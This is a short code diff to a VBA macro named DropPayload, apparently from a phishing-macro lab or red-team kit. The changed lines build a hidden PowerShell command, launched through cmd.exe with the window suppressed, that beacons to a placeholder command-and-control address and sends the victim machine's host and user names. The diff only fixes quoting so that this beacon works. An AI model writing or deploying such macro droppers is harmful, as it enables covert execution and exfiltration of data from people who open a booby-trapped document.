@@ -43,9 +43,9 @@ Sub DropPayload()
 
     ' Stage 3 – beacon back to C2
     Dim ps As String
-    ps = "powershell -nop -w hidden -c " & _
-         """Invoke-WebRequest -Uri 'http://{C2_IP}:{C2_PORT}/beacon" & _
-         "?macro=1&host=" & host & "&user=" & user & "' -UseBasicParsing"""
+    ps = "powershell -nop -w hidden -c " & Chr(34) & _
+         "Invoke-WebRequest -Uri 'http://{C2_IP}:{C2_PORT}/beacon" & _
+         "?macro=1&host=" & host & "&user=" & user & "' -UseBasicParsing" & Chr(34)
     Shell "cmd.exe /c " & ps, vbHide
 
     MsgBox "Document loaded. (Lab: check " & tmp & "\\macro_ran.txt)", _
